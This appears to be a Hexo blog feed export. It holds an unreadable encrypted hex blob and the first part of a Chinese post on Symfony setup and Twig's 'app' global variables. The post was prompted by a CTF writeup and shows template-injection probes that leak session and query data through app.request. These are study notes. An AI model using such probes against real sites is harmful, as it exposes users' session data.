d387b57073db65be0145f415b6ecc4dd3207dd3c7bac9acdf47c9d4e9761ab50f59a9ea60114aa1ae22dd4d53e4bf54b3aef71c93e3321f00dfeac9419a5e847543aa91f22b8a97d8c45be0d0d1d4a18f795ce2d4e8428b8a2cbb601b815e09a70b4832971e8220bcc4bd20cd28ff777690000429229608f70c049b9bfccf1b0d79238982918c5ec79ebafb32e45713c5f496182a1ca843fc29e03105b3f2112028ec0e2d504950486626a09afbfdd0f2d876c10515732ef218a71d5df351bd1cd2d68858ca26f755a703ec5a5c9bfea2922ad85c0e3a8e06d1de9fd46adf46ee695d8923cc826341231d27d18214b9e5f1ee4b9a3ca7f4a051ab29d63b59b13b093d02c3ea2fead76d8be6ca3c984a22ea7556e76bfe718dff6f9fea2bad64717bb84c09dfceba420a92f427fe5f98ef1ed331e3d2342a4a2b8e90f2f16b9fbac9660a33512080ec0a246d88e6a28700aa06e96a22c61808d196b32c2d1af7508441df6075ac60e192b9acefebeba68bc577ec02a0c20834d9dbc02d5fff73f63a262d91933b761b158566b1b36fc0ad248f4f6fb9d8b001241d010a02b068f0426f534af7ecd1b78803940226b88166c45e0b79195f4825c4dc5e4f0a64a4b9d3ae237d59f2e6c192fd5a62ef7482fc1a41260db5129feabb61905071becb22c462cc186a9775fa502489b793ae1401a6603d35d3138ce18e4e41b583b1e3e5b77f582925ebaa8f007cf6550ee0116fa14bc4a449c48f76ce48942c939b7986223834b44fe625d375146ba2db6d31543a1e8a8e5ad26f4c93a02f734c505331f804f8c090795ed01a06d3ea2b44dd1bcd812b7af08af55cee317eddd4bc60c6cf0eb61314e2dff33d306753c861e6898d50c780028040f12b9236c7f26961de8e2f14195fe3f87e7d45ff82a051d67ccb8a874edbb68e5cac2555e7e68f3b3146b462c100f507d074abd452600fcaf0ef9776f54ab7167adce304d60f87f1d29d122dbb30b4123ad0b1cd267c13ef5d56ca1c5fa73121410d9823b0ba3f1f6bd32d34c4858547f82677b9b1e949a1f7beb7ebc25491190f0d673e29fa527691bb4cb3991ba5669bf973adb7de9fbaba88b798bb14a6784554e662c49d04d3af4cf22509f98f3e4ab4442c1677ef027fa6cadfe4c0dda001f804599b747567e5c74d8df84e0a9bfdec96c9d69a24318d60f039708a11c6ef56e6a46df88279999f887c180e679ba4315100254b642251f766527c0d61a16d2424654a9204c506f6655387d4f6cc673b03ca3f13e91d8b85b101f0507991fa878be41ad66f064efc1531c816e1cd6d40f1b3ad13b3274b87c5f06cd9698477d6b3216ca2bfcf745c307d6797bccf9492879f9190deb537d2124ca3292f52f3110516b4419f2ad64019e31c5fdeb95d29f1086bf3438e8ed2652046ac2a3fe0c60f37b0abc2a27533248cef4af4592c387fc17a0b0d015febf0c2e25596f71de04cfd12f386f559b7be08b7a9541dbbb4b6009590241d95b2be41780296e2d69145f5e4813aaeb9c3c4b3fe481dcbcb69cf591a6fd30fbe02a26a67122fb4c69f5176819d9da0f186ed57f3bfd40c9e97dd0cdec15fbcfe0eee90d1c3cda788abae963632554295969c12a7d533edd54d8e2843dd0cde9bc1891eebedd26d0e56d8692329d4e1254e503ca88ab18aa8e609d2409f1df66e363265f9d398eb3f772ffd3d92dbb478f96f378889d72ee1c7b3325cc8d2f8f689748eb90a8da1b9038eeb81b4954cadf4efc6b4810697a96f626985cbdb89da7f93fd6bd24b21a3afe2bdd9de95e233dbd9c6bdacf54e2ac1ce2133e79456d1da232fc7ca9c8dd80d3ae5c73220b3e0fbe4f5adc09f0b83bc26a642399d842f40808304b8be886d42028b5aaf3615ee0b8bb97f06680497277173796a27a7d9d858c2bd6979d092ef5f6d153143427c9f0e179092baa60c6aefdf62ddd173bc4f4243c02f4f57f42de7d7d0a86dd3d46afe2bc315bf9ed93509884d2ad90368fdcb666e3b1634be355e71714a24b9c864bdfbf64e7cd3cc72ce4aa3d305241b47a707bb8e128f983eec1fc78a3bcdb52d829cbb453314cdb97c6d33738c0313fa2b182c2db65b2ba5f76f8b497002f51d487f43cb37d7490cf87b7a32c096572f940a43d0bfac91a0ab55cc58a63d1ae3e8325200d95cece9f4b7efdf5a52f6806207c18804903c2ca59d0386685809edfe9348a984fd31b025de68a44cc17ae7609070094cbb7f4bb835e077986210a0490c1a1dfd45a3bce30ff19bc79a0d13aecb7d934a6914f77a52b5ef776f97a83840a8cc59bfd018ee66f2206d429a70c126c5db4a5560adc8508fa45fbd140becdfb71bff55a36c144ad219a5de367d1f61c3bcb85d61ede69a3159c16045ad2ad0495a225992dedce612a0bbf8d07bc2fae547e33f59615fd11725a588fd8c2fcd893dc3fc3a47c101f70adcab9e63a644ad3b30c7c8925b157658a0067e29d48e9373d4df2701680f5c77528ef6aff3fdd32281bbd6bbb1ed46dde0029789c9e0b72c08b5130329ff0dd3004d360294369cf62292b5383f65329079351cb4fa07a0c428f579dbd455ba51baec33ddb52e89303234efb2dad281400979babd99904735da26b516a1f0481aac6ede4daff2f75876f940462a9f05c2a989ddc26043fc91a16ba3834435389afea07866eca699bd38283c6a5af245ce2655c6db1cde4036e05d88bd336960146b6822ab50a3bc64083fd843c40f97cf81df04b00fe1b1e561d00f1e8f6c69a7db580daa5f4fd511d0e55ab164dbcdd44a391643840e5ff39e6f9a6314a861c54d85be7fbf6ed2c8e36b93f63954a84f3cbd810304ec36976d180c0098210feab05e6215e8c80f068359e6d77afb9ed902a01164d89b74faf09c5ca7442639c8cbec71d697e5e38f1b6b1b2bfe7e6e0fb65bb1530dd42c3b6b7a17a32d259b8103cce7adc5a5b5405ebe94fb91c1bf29c54440ca163e969a792ae0fc2ee6e2b10d33830a4b168397aad1c25fd0a3bead0965d1619fc23005a0da7c7a5780119ed4e9983355c0de5a59fdb68844bd5172ebb309e5e2b8a832a7144117308219e6f0a14852eda15e53f334077862bed3ca6dd9a51e20775bddce340a8b2b7d97d6449b65b5c153e8914560d7b62548272a9c2c5d913af4671757501d69ee5277c8ef9b79f5c1d2762a2e0482d8c52ef4b35c429a8434056900e96a119ef62f7b7c2bddc7257b4022e9f5613deefc75c7b96340a7b2a5dcc4bb79bfa2629fb46f5980d6c3f47592b67336516cb0cf5b737e56b31a91010b0316096c4ded0ac2d60946d5b516167046ad9aad4b8223c05001751c86859e0f4fdecf152e3eeb9266b23e2c78f5a93c10d93042c3a4d7284eb4c147137460488a2bbbd04b0c1050179e803558a396823746231517df76485f99b66e3c55f95660e067ed76f125bd7d3bdec198ece386fe5db61cfbed74baee94cb5ecb3e460131a3d072aa8af1ea9f1126a4ce586f3908a32e268ee93475aaf203b330f926d68787ecd8ba111d09446919ef4f1a3c763f6d4e333c21ef6d8a93be5e953f508743930754eaf5d39443c731601fb29fbea8285806336aebeea5367744bd2dba360062a8485deaf5b8498aa95112fc74c3f130cb80bea88e34b685e7930d6b2ad62ce031d1a5de6de7c514aff97d5c032de7a0dc4c5158a3b58187193cc9c729173d55c5ec7395899e1f6984641bdbdc20e4895b1b380895edd431e597ded67192f1b2e7c081b4d8ad2394f5bd566600862d1002c6709fc37773ae2a5d4d06213122aea4d135c21a7e0f3e7829f88c2bb980818257c7977356467fc41d58f032b85b11b5a51e39600a9515e6002664a591f412df54db09e074fd2e735e32847fee4f9ed06fccfc13c7c7abfcc41107a23e6e32795c3a66e02026088369a537d304e87161b2dddc15901b58b43dca4267543a5493dbf439e73f63fef96c716d42efb8f8422d79d118e49cd121dd0f7494c4c69ab86415b32f0a01e201ce4ab626fc8d6094186efab82f56923f1380b932192a2f93860d71ddadbfd0d7b47a9f05e636692c58ea66655139b64bb24f48652e0f7a205f2d1f5281efd9cd342dfbc033289fc78cfede08db9843e23c416daeaadaf64bae889f3c26c89e45f42e04552c643877af9b6e94780d4a5dc217b6523b9bce6e289339f0f34ed37ce61d310bf28f574f194bb9caacf633e5ece739ae907d783fb12d2833932b7cfd9fc810fc58b6ddaeb48c6fec8e24504b1a9250e0360ccc51989332492eb11b706beca42763c5dd2bf23b84b7782d6bdfd3921bbbf3296c9cc916a102613f28a668bae1a51018278c8f5aab84815bddbf181f64327da9aa0085a8a1f5f9db0fa0d2a4e5288b1c84c2bec93a19d2150491a50d1fbdbb01920c530a456d92097aee226bb0dc311a6c48d5ea2ee841747b0f795b31c301796dbc38d107d2ec52956bf99603c85d64956d0328c91f228bfc6ae779da7654948367659a5f6e861fd83611506e53ab2118aaca9dc16c426af7f2a5f0d08aaa641c47ed9523f6b342b28735375aba0b4c6a6d4b7eba5580838220641e1abc2634494f940462fa034ad2aeb3f51f2060bbacd7881da116077b4b25664d6af03e8e7cd90345468e169726e5fbd0e7753c37497c3ac1553f5c1b19380958ecc520cb457fdd8550fab251944f48c532ab99883abdc05f7c125391900b8907d2e7af1ed6366046a0950506a026628b2a2b12c441d8f1d595b7a6225fdcaefecea7e2ef568639c9621ce24020e678e50fe6c5e5e2d56d859e1f446b9a5e5af4d5e9f50f161ea28cf8e71c20167af5d17e3793e7f2519f215cd9cb6a57fe228648b5b27527286d8c87052cd3ab674c5b544a70b49ab6c91ea54fd956d80ec7cf95fe496d02f8e9cf447103575ffffd7f99ba4f681c938e76474bfb94ac721ab749072aafa0146ef0b3a81c2b0a638f3a1aeaace5f6e6bdb64a42e449a22d5ff636166eca4f17d6cdc33186b5db5339531ce4efdd0dcde0248b7b8088d632d29baf16079f84a4fabbcc17e7310b6ee3f6fcf77591927a8e65585b78a25ab49c827ad02eada91629049696871ddbdcfba8ac83f598cef73ba18aa8b8e410f441205fe9bc58b8cf5648e0257374ce2ed277522c393f35ce48a87e49487171623e9cd887dac80896d5aee920b22b1d60fd31c737116903ba78d2186d7d54ea29bd99259b8156d83b70d65c495fc44e3f861f3b7c151ef8c75ba5fa186e83c603a00eecf95e33cdc408c5aa19ac7a22ce11a11004b43318e368347741e40576bf98cb173a9281aa2ba61bca554ccae2979241b72bdb95b9264679734ff13e1ea6cf27ebdca350d87d0dee70dea0f38ad519b2cb4f79496a332e60b64d96139055b3f857a25d46ee820577348a3ecdf584ade1ffa1d74aa859fb7aa0965293819f8c684a58655454fc7fdeb162ea54c144c65d3d51732b4c163d6ac5df3530c474ae8b7312d44fbfbd0d7607a3cbcf9b455d97c59519f9abe14417e83156858c9d8053df2e2ec37469127adeb358e5ab597aee025cf2a36f5d641150b31705f89af25bcd4197277f7cd8d12f022d3bab9dc9cd3fc9467ce2c77bc2ff90258738c5c138061622fd0fcb7c3f459801ad527cc7776f9fa4e14a61100b9da293cfab0da5b613e723e629f7a0f93293582c1da10d717df7ef7d7cf25532ca31f3a7064ed76bb728ffbda5721ede428a2e007ea2dfcdb56895b2f59c1095713a1dfcc12ebf7acff68a896f4f485c361062f4ac436758f573f3ec92cbff70edfff5d24185586e91be25fe2679c320965f934c5680c20a4baa0f9c0c0d1089c1a1be5668b03c2877a71e2d39fa29b51c1b56bf6907424c6c6847a4e24d5c56f95cfb1f3251b10d7c6ed54ab42e28173c9205baa6c43fdabc36fe92a1a1e73f8cdad3abbb0b097eeed20d21e792b446c9a908f2e5a272ca3e90729b2bb8d2fd6b456904613529ba93a17c50dffc4cef89d8fbda71d8591397a767cda38ab31513d7bc87eabc37e0736cb1b6a480a2fe64e065ccdeb7b675dd2d4299fc9929f3b1e3ca9bd1ded0889454dcd276001feedbc444548d30242f59d2310879e1e22f95f56b68c06970da323a7468b016cfbc43f547b98e2eb6f055232526d65193becc599486670557f0fd10e4921619a291cc8539e7988ab34cab094dc173a66410c3fc5881adc6628259c06630146b445c9302b8ad6a2e2a9be222234ff00c8612d48bdaf8677e2ea211f1681cc315ccd6e5c3a4805ce5d89b1cc47647a2702b42d4e81b79b31c6fe23cac367f1722f3f4a4580e30794726dbddecd1a8261b920d124f854354dac5b1c2643dec73cbc83bc8119399a73b17741d1a03a9663db42c2c3eee57bb3f05aa96c6c8783606ace60e11054e76a540b6957ba1510648bcfd8a3dff3e68dce67532a567067a6b8618f837da75bcec4189960afd8c87b31f1eaf80916ce7a5a5c97762336f5f1c4239b9a0399c86ba90918a5d51771936a6936babbcd6fd8fe0569a83c8d99c3c326fbb6cf16cc2c62956cc136d00b65dff132fb9ad8724a0cf2d1809df30147c5383241959da7cb234fec1f014c0cb64741bc791a3b9a97f2e7976abd0698269483eefa0427f66e83f34b21a871a4124cdf6e719b9f1f1923bbef8999c5c6ebec6021b86cb1662c4d2064685008739be9685ff6fd968983843a8d78896119f04e6674e9a935f217d91878376b680195fff3f8f668a9a88eacf3b6c71b6f79218ff8b21fe6fdf22a917d2de4cf48d8279eebdf8a9c355c4bf82ee7de4000457a2edae6a71aa07a7bdc06406d05a797ed46ade695f27adaf0e16f74b461b647dea24b6efdd59e8325450961f4867f9c7a828efe7c54fb82f2b8a2e9c29fa56048474052ec1018a89a0ffa9d7bcfe934474eec2cc59c6ea50a1bad062690da54d47f163d134e6962cf5aa20a56a9562ba6e923b15efe30c54e76ae2410528571b2a51057b4c42f8d498e7fa7aaab67d9a7a6ff056e6e2a41012e49fe026f9aa78bf80ef98fd60ab7e4101ccd027398826f251f1f01360849ab7d0fbe4add3146748b3d9d6ab33335692a8ed30e067ae0e4d882de1353de64cac40e0735a333cf2f36c60f21ec665a3319163d5bea8e7d87a4df7e8689764b600b57eec5187528779dd9ceca3c5e71f7fb18ba739f87b354364f5a14d9ea3511ff704ff916c76bc9ea621aed8721c4bd40b0747880d31f96d70af0d2656fdb6ed6e7a3ab04d3060dd33e2812239a08a962831d20019a42a584f467e1c0f8db1971b5b2140bf454ef757924a6a98f68b060d8dc686ed697c162bf0c65b5da091406e7d0b42e0340abef29bcc7ffdd060750c7e0fbab17e9f32c99fabc509b35b1fa5e6d9a93b659e899348ad351b013bc4f28d9fa0de735cb843b4799614526f34e08b0f5a19e12fa6013657de0206c9101acafd9af2e4f1c9edcf8b5ef73b38bdf2f535ae4980228e1bcf1fb9bd187d78c3f7a41b3933d9208c88cff6584c6f60cd9660f0c66c95dd4096210119f2b6e82463f5eb6fd6b8d6e53a007982a4276165fe1d2ad21277f7ad3145a305bf2461a26f9092c914129c8f7403e77df38dd6006df27509ee8bfede6664cd057d84a21882dbd080dd4dfa0a794adbc405f6b057fe2ca5c8825688660c15dfff10fc3abbd3ba798249b7cdf0b7edfe74203af9e8c237391db24b8f006c98de7b69d960ba9a6bd89e1c949c99a7ef73a2862325d38092065b228536a9c39159a236bba40e7ede233cb8555f4c4bab92b31bf407c779a2ab0f5e4c4472e8e4a5c86ca0cd51301652569662f8b86d45fe9af268b1fe56a973fd0337ad1059d920a15e332dbfcc156bb2ec642e65380dc7674133495fd099b09b1c67b87d7bdffcdcef811ee51d13185414c3d8a877e27caa57796cff3619e8a11a49bd964b02181a24e488653a319f61384968ba7033d9b6aa523937ef1d5bced441ebb3088d69d6c9f221504c18496c9461217022c3b2e78b553a51c15a10744ee66ca7d55ea59cdd91338785c177df6fb3d88e83a8e14f5d43dd3466d398642049955b92b77b03d1e081225cc13501b2d36f2b525d37931aaaa8a5bd5a7afb5af1c9b92bd63ada6361f1a2a962685205e9273f712e791284d451348755a59bee33537c7145d62e75a3f6b7c9f759afe72c3f17414ca6e390bb835f5508009b64a5ca9c8eb79b3f38c8ed0731c8da43cd46ad7893e7987a9747734b40f64646bca6eec8c08df137a9b791abb06c0badbe50f01d8a40bcb81c89bde9afb1173299f0490963d9553ab5680f167da5f66e17bf36c326bbbd921c2da12b7687130c344a99f695e5ec9ffbe721f74d33c6de48aadda7b8f904c299b7c4899b70fab5224cd8372c91f8ca8e2559bf2e9dd1b673bda9b72f729d7bf70594a52dc29b64a3fb5e836cc48b112bf3fa9a5400e59cedca803b6bfe3f4bee04e7671a577a68245106639e6de08b50693769b37ccb31506791292e85b6bcf9aa41c30a3c391bdc84cbc69d5e4a70146eaaf562263a6fe831f0210d5a17d3ebb1475e8a796f33e277309333195e0041bf30f5496967ccf6296f73e3f11c1af5bda853ce75a6708d53aafb5a7e8e055d7b7a39b1892ed4fdf2b599ee743fca1b7a6db19918f0655517ae5c15496eb37fc91ad2c9cdb9cf69c5ab87218c26e3ef7ca2456f67ce877c76c6ce35e271be74e1cca6a425623140e55224a3f3bb9aa3e2daa1cc3219f8d9cb51608f76b834df33c07fe9d2d1f39832cf144021cd3f278a0156c28f781b9ed89851c79bb2b37a902acad916be943b469f46ad81490f9707a78b7d4f824f11c4577845652bcc04421d747c3ad8a7ed28c32fe42a575c42ed5f53c2a03f343f381444a56818618e55d401622c14fdf4e4645606f961c5014f415cfe8b99a33ac85b3fad60eedd3a790ddabbd0a3a54881e3c31eb3d673ee995e9a905221b5217695c357f7832a7252fd7240f636e268a7b8f587a088b56cca1ac61b9603a29eb90ef834fc3bc528a25fcd52aaa03f568dec8ecef1f4ea129fed9f32583c17daecf30b2ab710d629052c1f8f66ccc49eee21a7ac223c759fc4e2924d028aa6219b715572914f9d766162a5b9fe5c25f42bf1e308af1d3ec50e7357ba85e08f4be016931bd0e0c18732762e28e93b27507feb3fa7be9b5d01ac771219952a23aa0445063834f71c571b17f96ba63ea3f39318669f43e39d2e46026cdcef6fba52cbbe6fdb22e768fefc97a59e839dea8e4dcced6e9fcfd494ffa5897678fb71817136bed5622d58cfbfa1daaa9dca229aff4f5444c78b2909b7ded30cc81b89bd446d1ae1e4b095e48a55628d012cce1c62b6d858232a750d68ace738e4991767a8360f602c38703f616ad8082ecdb063ce7a11a570e221961ae879467ca073a76f144ff03fc936d51f26682a7308e980229122ea949139e641abdceaf571286aca478aff282a4635e5c5f421308920b1decf0f5890fce80b70192cb13e5c7bae672874cea926237990149914687631473b31868d6e5dd87c68a65f116d0cb1eb4f594283368faad07d03f0d760e681af5ce613eff5cc66ff3c4f9c262b33608e011a6846548bf1c329f55a9641ba6ff3bdbefe25fe9379b7b64f9f7e64082a274529906bd800aff31d3f2bf1841266a33cbddb9b325f076da11ba439728d882785b583ba4f01273b5e97c3dc38e8bfcf81e071d4417c4721a62c5a6fb09b047734d07565e83c8dff3f063a70eb351af96a92f1c101a9747ba17742652946a59dd1e7d73c467bae2af0a0b8bcdaff1eddae55ca36c5e60ad14e03df5460c8c656d2227e44072321541115df36ec14250889c9192882a58d44d5c124a5dabff5842081a9db8a014af9880b83c2e129e1c3708b9268a3b602637e765b26e33961b813b76fabb648c491481785cb7a859b6fdbf69b2a23f2383097d47ecd62139415427d43ac56b1cee31cab2322cb7a7eba7790d53aa4641cfb97f1b9179759474faae743b73ce0595619b601ba849c8f9d9cd42720a7390f8e6ea5c108c28433787f69f6a0e47fb3e41af5bad5873fd95357219015ff37af0a112202d5712240f48becc68ab6572a1f49bcdb18f5fe0bea427d9432d745f698afec77833d606fcae9e8acd4d999ec26bde2e4197f26b7596752896accc0ecd4510f22ad2b49d325a81aab1bf6836f1caf853e218db489e76bafbad8de6dc764d948c21b82b06ed6c02a4859adfd4ef24fd8f6f4d71bff12ef3af24e1d257f5cc3e001166469b7402f6364cdb6f4b13e8af559d52e5299f65e4f155921d215c32ad63ae295494e5503a8e498a036dfcb4a52232691c277333fab481b790cf0f01aa82cb95025ec0988b5da0397db4429dd3a857c99689e9c6ae4e522e3e45c29f42d148154fc38b9532faaf1b83ccc3cf8236761d316dfb8018ca3a500a145c37fd584cfdb0412f95d2f74c339155642b27e92048af39be51e38b778b8c3903ebdbd229121dbd00dbb0f4cacccb713eb4f2ac0842fc0d290639ecc85c4c6341a116891c34ff038179831a79bfb2f540d87d6bf43955f63915f57650b8db3e8e5f8154d5bc85726963cab4a565df5c401f6ddec9ef0d60a132864f7d57ee0823f84bacef7268583a669b98cf1221d79cc7a7537db597f86eaa574dc0a86e4aad0bec9ed34c97c49656b57852bca1f13b80d443fa3b7a4dcac4be0d410297dcddbdc7aa6fdcddb831c565d214d88a37a5207dc610e02e67872705409baf5962cf6b5e24aef60a26d010fc411b3bb47491a4a7f2b647a7787be1641e441f333358630be9d1f92fba67671bdf56a788875dac31e7da89bc56ba0ff4c6a070dd7cb0bfd13256d0b0e2e4602694928be0434e35739524aa84acde53772f28bc432bca32347fac2d95e359da6c11876e12d4ace82c5d6d70f2936031afb6973a7f6bb7fcab94ec8e44499200535e7295d91c0b3e0e47bab89d8e918ee9117e5660c76c4d49d25ff0963f70605bc977f46c755577359d4166cc53cec17a3d28dd74a450e4d5b6e01f5cc21f2d4b56bc705825baa7a5f40680c9ea6f6c0cf2aa036b3d0683b86e37a16b00e74ce472b70fb024d10d8da204aee766094d34dbc04658695c2aaab7affbc90e30151b76e32357f3295aba88750ec874e91c180b082ad013c3127ab32a36026aaa08b10c95befea4354b918c6183a2f2421c0d53f09249246f937626e5a9de00c28ef48095b731af52c0d0446e18c8e8d982f9e22c42a4b29bc8b14331db2185d2828d0ddb14f3d2b7048a09b61281cd2094b1a959f5d85da194421aa81fdd4602d443aea17f0c9d445870b7b9ea9adacf1171ffffb7e60ed16e9a7c17d0fb259a55e9fac9400743cdc3c693e3a28b1e43d51a203a663912b054d5bb6ef960a8ff3e93599885867937af97c3e5468d4ba6cb7526740cef2b86473cb8fcfff99aeee2eade3205fc40314a945ea4aea6ca69f851ec7ed2253f6e8a1a9270950e9e0e747669837e6ac5490dfcd970ec9d490de9c385184b807fcde76676c5f6579ead79e477d25727e28f1a75aa39265b1357bf88cb993a3d34d05995fae8901e035907bca9d368df062a1e8ffbfaeee28f42fe01aefa3bc56409a280662e1cba6467fc5afc663529cfe3d971ddc28a9044c28b2ed999de69884632638176e3dc32d80151b897d82bd8fc9ed8973f491e53ad7b902153c38b845a8073046f3fc0d2a97e2e707cf55ed2aff1383f79de670e3a7eed5726bb4d1d124531b5b4395b19aefaf9e76ac24dc2ea05d5c7a51bc2b23d2eb09d4b20671ce0ab01ebf2a1d9aba0a570e4c338221faa430a3c835b41d724bc1a445cd0e0e58795e892f5f6b314f17f10ff47fc8db640cd236975b24114fb6bbae4ab981535dc139779dd1d4147ee65c73eef12ff592221c6089b2d1a61e84258be3ec8f2e719d2b52c7c0544bef3feb07912f3abd1ebbc101a2a92650cd4077675bd5640866a41073d727508fa9b3a11d42f1cf65bb9fe3aaeb8f63c6ce5f1edb754203d3d629d679273de6138a85e78eeed87db196d63e0d0cac57f799e5ab27b80a3f8d026027422427462a8093a2a1cce2d6d4c678a8c5088f7fd21ce0c3751276cfec32eafeae5be870b85eecfa6c5b21e10e34055d5138f80f9a4a5422560c672a15c9942adb6aae4915455b4b9607d94669dc0c63b7cbe2c8f0d5cf2f8096f7181bcf6b7ab662a5bb83350f58edf8b8341804c3ab4decf9ba5ada67d8c4cfffb8fed2d90d2518d6b70f3e6154c4ed1d808681793770f576703abaadb192c644b9343c548aec88edba073f4ee58ef2fd75ca8ccba285c18c5b9fd0938df4cc72e43d07074ebd56c2762629f3976297a86d1b475fda3ab46689539a38df4902658f4a0c752dc813dad68b4fb2e39cd0c8edf01fae19b01854921993a96383d59b5fe6b8c9fd00542612ec01c81496e94a495d4713d47314f0014f689355b67bd3ff98daee2c6af21dabe68d81674fdb32a042ddd5e27bf936e2eef26735217c9183888b0a6bc7f1ed8812b463dbe718c03bd6fde1c649917ef772efbb427a979430784d035bf7b7ae7c9d75762e8fd4e9b5176884c78b5ca2481bd1db7ef87ad801e658d6a612687b9ea66416e2b9e5c9172a2846041b1be897c1272bbaab13f11e9a2ad863206d59d048fbc63a48b60cb1a7c4d447b07e829bac0e7f3474110acceb21b18fb3ca72adc68a3a0863205d4b8e3172b362156fdef3973b37231ae6afe00ecfe2839a8b82b4657d49dd8a81c5f0f8a7a0326e4fca5fa14bd240de570705c2ed38ae83d0f80485feb186d97910ac1a99cfcb6fe71401bb03428498b11895b85e94226da8c7ff9e02445900c2518c33dd78adabe7515350780096c19f4a2d112b5e843f8f7e3e16428075a06a2c1799d2d1d545e124e503cde461a62cc4b194564f3b3ca81be01ac90cd23e6e6e51aa302b58aab109a2c0119a154781e597bafed472691da8f12ff23ebea30361571e5309548b0f941ca8057b3b9d9684130ad4487115d0dca63a372f956253ebb396e277dc8bb5f6a3d18bcf30b67eb82c6eba03cc29c01c9da23371ec6a438777e63963aa3a785672f090e1e4b5fa6e817a8888aafd519134452d21afe7cd740e1a37f85db7a8690c2567f361e957117d898eafc79805b1c91c520500bf5221900657674424ffbba8c474fa2eba1d56b3a0c89be806a534892b8a054bffa723a8bd64d73367ccee3f47fe06e67cc0110cba8e19298fc7675463963bbf512aa3477f234921fb16744ee5b0994fef34d2c6a766a553eeb69955c6c76e70017698770bdabfd457244c77f78ea64e0ce9c2eb8cf56b0b95cb3d0e879fdb37d09e7c968e46096390876bca96bdf2b3adf738476504aa2efee4e6f0d2c10ba0e16f2c56bc4845b9fcf04fecffa4fc62d5da10b0403954a49c3ede17dbbd37247da4262e4fe8996686877cc9ebd01d07906504f2c8f6bf66ef0b4dcc27ea15866705e7849f2d0adeff6cda8971a22f51c4957e63d13366b23f08c3e73f06f77fd4277f85648100d394928869bb60d5cca9548b07dc132dbad281365eed0e82493f5d93d12bb59a773846cd62d0e3b6dbf4e0628c84a838379d94d036a366b0f3e0b4ea542eaef7e28af1334edfdf05147ed9aa52ce161dd63f6d1460437</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Symfony和模板注入的简单学习</title>
      <link href="/2020/04/01/symfony/"/>
      <url>/2020/04/01/symfony/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Symfony"><a href="#Symfony" class="headerlink" title="Symfony"></a>Symfony</h2><p>安装</p><pre><code>wget https://get.symfony.com/cli/installer bash installer</code></pre><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>使用<code>composer</code></p><pre><code>composer create-project symfony/website-skeleton projectname</code></pre><p>感觉还是直接<code>symfony</code>来的方便一点</p><pre><code>symfony new --full project</code></pre><h3 id="检查安全漏洞"><a href="#检查安全漏洞" class="headerlink" title="检查安全漏洞"></a>检查安全漏洞</h3><pre><code>symfony check:security</code></pre><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>好像有坑，需要非<code>root</code>用户运行，还有一系列权限</p><pre><code>symfony server:start</code></pre><h3 id="创建Controller"><a href="#创建Controller" class="headerlink" title="创建Controller"></a>创建Controller</h3><pre><code>php bin/console make:controller HomeController</code></pre><p>有一个注释路由</p><p>安装</p><pre><code>composer require annotations</code></pre><p>如果是用 <code>symfony new --full project</code>就已经安装了</p><p>用法：</p><pre><code>class MainController extends AbstractController{    /**     * @Route("/subscribe", name="subscribe")     */ public function subscribe(){}}</code></pre><h3 id="查看路由"><a href="#查看路由" class="headerlink" title="查看路由"></a>查看路由</h3><pre><code> php bin/console debug:router</code></pre><h2 id="symfony-App-全局变量"><a href="#symfony-App-全局变量" class="headerlink" title="symfony App 全局变量"></a>symfony App 全局变量</h2><p>app全局变量会自动注入全部<code>twig</code>模板</p><h3 id="app-user"><a href="#app-user" class="headerlink" title="app.user"></a>app.user</h3><p>当前用户的对象</p><h3 id="app-request"><a href="#app-request" class="headerlink" title="app.request"></a>app.request</h3><p>当前的请求数据</p><p>所有的方法直接去源代码看</p><p><a href="https://github.com/symfony/symfony/blob/5.0/src/Symfony/Component/HttpFoundation/Request.php" target="_blank" rel="noopener">https://github.com/symfony/symfony/blob/5.0/src/Symfony/Component/HttpFoundation/Request.php</a></p><p>列举几个常用的方法</p><ul><li>app.request.get(key)</li></ul><p>获取<code>post</code>的变量</p><ul><li>getSession</li></ul><p>获取session</p><pre><code>{{ app.request.getSession()|join('')}}</code></pre><ul><li>app.request.getUser()</li></ul><p>获取用户</p><ul><li>app.request.getPassword()</li></ul><p>获取<code>header</code>头<code>PHP_AUTH_PW</code>身份验证密码</p><h3 id="app-session"><a href="#app-session" class="headerlink" title="app.session"></a>app.session</h3><p>关于session </p><p>几个方法</p><ul><li>app.session.all</li></ul><p>获取全部</p><ul><li><p>app.session.get</p><pre><code>app.session.get('xxx')</code></pre></li><li><p>app.session.set</p></li></ul><p>设置session</p><pre><code>app.session.set('key','value')</code></pre><h3 id="app-environment"><a href="#app-environment" class="headerlink" title="app.environment"></a>app.environment</h3><p>配置环境</p><h3 id="app-debug"><a href="#app-debug" class="headerlink" title="app.debug"></a>app.debug</h3><p>如果开启了 debug，就是true</p><h3 id="app-token"><a href="#app-token" class="headerlink" title="app.token"></a>app.token</h3><p>暂时略</p><h2 id="关于-app-request-的进一步学习"><a href="#关于-app-request-的进一步学习" class="headerlink" title="关于 app.request 的进一步学习"></a>关于 app.request 的进一步学习</h2><p><strong>想到看这个还是因为打比赛后看writeup，一个师傅想到模板渲染用文件上传来写任意文件这样骚姿势</strong></p><p>于是就也想看看，感觉没啥新的发现，<code>wtcl</code></p><p>最简单的还是查看代码</p><p>在<code>vendor/symfony/http-foundation/Request.php</code></p><p><img src="../../../../../../../images/symfony/app-request.png" alt="pic"></p><p>一个一个跟进</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p>是<code>POST</code>请求的内容</p><p>有</p><ul><li>all()</li><li>keys()</li><li>replace()</li><li>add()</li><li>get()</li><li>set()</li><li>has()</li><li>remove()</li><li>filter()</li></ul><h3 id="query-和request对应是GET"><a href="#query-和request对应是GET" class="headerlink" title="query 和request对应是GET"></a>query 和request对应是GET</h3><p>其中的方法和 <code>request</code>是一样的</p><pre><code>?a=11hh={{app.request.query.all()|join('')}}得到 1</code></pre><h3 id="attributes-和cookies方法都和这两个一样"><a href="#attributes-和cookies方法都和这两个一样" class="headerlink" title="attributes 和cookies方法都和这两个一样"></a>attributes 